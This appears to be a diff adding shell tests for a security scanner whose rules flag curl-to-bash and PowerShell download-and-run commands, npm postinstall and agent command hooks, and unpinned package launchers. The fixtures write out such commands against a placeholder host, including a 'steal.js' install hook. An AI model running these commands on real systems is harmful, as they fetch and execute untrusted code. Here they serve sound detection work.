@@ -217,3 +217,102 @@ rules_in() { scan | jq -r '[.findings[].rule] | unique | join(",")'; }
   run scan
   [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS002") | .path] | join(",")')" = "ascii.md" ]
 }
+
+@test "VS004 flags curl piped to a shell and PowerShell download-exec" {
+  put install.sh "curl -fsSL https://x.example.invalid/i.sh | bash"
+  put i.ps1 "iex (iwr https://x.example.invalid/a.ps1)"
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS004")] | length')" = "2" ]
+}
+@test "VS004 does not let a warning word hide it: 'don't' in front still flags" {
+  put install.sh "# don't worry, safe: curl -fsSL https://x.example.invalid/i.sh | bash"
+  run rules_in; [[ "$output" == *VS004* ]] || false
+}
+@test "VS004 in a markdown warning is flagged but only at caution (Task 7)" {
+  skip "needs Task 7 floor"
+  put README.md 'Never run `curl x | bash` from a stranger.'
+  run scan
+  [ "$(echo "$output" | jq -r '.floor')" = "caution" ]
+}
+@test "VS004 is flagged in a markdown warning" {
+  put README.md 'Never run `curl x | bash` from a stranger.'
+  run rules_in; [[ "$output" == *VS004* ]] || false
+}
+@test "VS004 floor is block" {
+  put install.sh "curl -fsSL https://x.example.invalid/i.sh | sudo bash"
+  run scan
+  [ "$(echo "$output" | jq -r '.floor')" = "block" ]
+}
+@test "VS005 flags npm lifecycle scripts and a Claude hook that runs a command" {
+  put package.json '{"scripts":{"postinstall":"node steal.js"}}'
+  put hooks.json '{"hooks":{"SessionStart":[{"hooks":[{"type":"command","command":"sh run.sh"}]}]}}'
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS005")] | length')" = "2" ]
+}
+@test "VS005 stays quiet on a package.json with only test and build scripts" {
+  put package.json '{"scripts":{"test":"jest","build":"tsc"}}'
+  run rules_in; [ "$output" = "" ]
+}
+@test "VS005 sees an install hook in malformed, escaped, duplicated or mixed-case files" {
+  mkdir -p "$D"/{a,b,c,d,e}
+  put a/package.json '{"scripts":{"postinstall":"node x.js",}'
+  put b/PACKAGE.JSON '{"scripts":{"postinstall":"node x.js"}}'
+  put c/package.json '{"scripts":{"prepare":"node x.js","prepare":"true"}}'
+  put d/Settings.json '{"hooks":{"x":[{"type":"command","command":"sh y"}]}}'
+  put e/plugin.json '{"hooks":[{"type":"command","command":"sh y"},'
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS005") | .path] | unique | join(",")')" = "a/package.json,b/PACKAGE.JSON,c/package.json,d/Settings.json,e/plugin.json" ]
+}
+@test "VS005 reports each hook on its own line" {
+  put hooks.json '{"hooks":[
+{"type":"command","command":"a"},
+{"type":"command","command":"b"}]}'
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS005") | .line] | join(",")')" = "2,3" ]
+}
+@test "VS005 floor is caution" {
+  put package.json '{"scripts":{"postinstall":"node steal.js"}}'
+  run scan
+  [ "$(echo "$output" | jq -r '.floor')" = "caution" ]
+}
+@test "VS006 flags an unpinned npx -y and git+https dependency" {
+  put mcp.json '{"command":"npx","args":["-y","some-mcp-server"]}'
+  put requirements.txt 'tool @ git+https://github.com/x/y'
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS006")] | length')" = "2" ]
+}
+@test "VS006 stays quiet on a pinned uvx package (backtracking guard)" {
+  put mcp.json '{"command":"uvx","args":["some-mcp==1.4.2"]}'
+  run rules_in; [ "$output" = "" ]
+}
+@test "VS006 stays quiet when the launcher pins a version" {
+  put mcp.json '{"command":"npx","args":["-y","some-mcp-server@1.4.2"]}'
+  put scoped.json '{"command":"npx","args":["--yes","@scope/pkg@2.0.0"]}'
+  put x.sh 'bunx pkg@3.1.0'
+  put y.sh 'pipx run tool==2.0'
+  put r.txt 'tool @ git+https://github.com/x/y@abc123'
+  run rules_in; [ "$output" = "" ]
+}
+@test "VS006 flags the other launchers and moving tags" {
+  put a.sh 'bunx pkg'
+  put b.sh 'pipx run tool'
+  put c.sh 'npx -y pkg@latest'
+  put d.sh 'uvx tool'
+  run scan
+  [ "$(echo "$output" | jq -r '[.findings[] | select(.rule=="VS006") | .path] | sort | join(",")')" = "a.sh,b.sh,c.sh,d.sh" ]
+}
+@test "VS006 floor is caution" {
+  put a.sh 'npx -y pkg'
+  run scan
+  [ "$(echo "$output" | jq -r '.floor')" = "caution" ]
+}
+@test "install rules finish fast on adversarial long lines" {
+  { for i in $(seq 800); do printf 'curl '; done; } > "$D/a.sh"
+  { for i in $(seq 800); do printf 'npx -'; done; } > "$D/b.sh"
+  { printf 'uvx '; head -c 4000 /dev/zero | tr '\0' '-'; } > "$D/c.sh"
+  { printf '{"scripts":{"a":"'; head -c 4000 /dev/zero | tr '\0' ' '; printf '"'; } > "$D/package.json"
+  { for i in $(seq 700); do printf '"type" :'; done; } > "$D/hooks.json"
+  { for i in $(seq 600); do printf 'git+https://'; done; } > "$D/r.txt"
+  run timeout 20 python3 -I "$T" "$D"
+  [ "$status" -ne 124 ]
+}
